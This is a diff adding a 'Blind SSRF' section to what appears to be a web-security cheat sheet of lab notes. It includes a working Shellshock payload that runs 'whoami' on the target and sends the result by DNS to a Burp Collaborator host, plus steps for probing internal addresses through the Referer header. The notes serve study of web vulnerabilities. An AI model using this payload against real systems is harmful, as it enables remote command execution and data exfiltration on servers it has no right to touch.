@@ -31,6 +31,20 @@
 # You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:
 # https://expected-host.evil-host
 
+                                  
+                                         ## Blind SSRF
+                                         
+ # EXAMPLE: Exploiting the Referer header Change the Referer header: to use the generated Burp Collaborator domain in place of the original domain. Send the request. 
+ 
+ #EXAMPLE
+
+...Use Burp Collaborator client to generate a unique Burp Collaborator payload, and place this into the following Shellshock payload:
+() { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN-HERE.burpcollaborator.net
+
+...Click "Clear §", change the Referer header to http://192.168.0.1:8080 then highlight the final octet of the IP address (the number 1), click "Add §"
+
+
+
 
 
 
